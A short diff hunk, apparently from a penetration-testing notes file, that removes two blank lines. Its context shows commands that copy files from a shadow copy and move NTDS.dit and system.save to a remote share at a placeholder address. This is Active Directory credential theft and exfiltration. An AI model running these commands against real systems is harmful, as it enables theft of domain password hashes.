@@ -9,8 +9,6 @@ cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32
 
 move NTDS.dit \\x.x.x.x\share
 move system.save \\x.x.x.x\share
-
-
 ```
 
 On local attacking system:
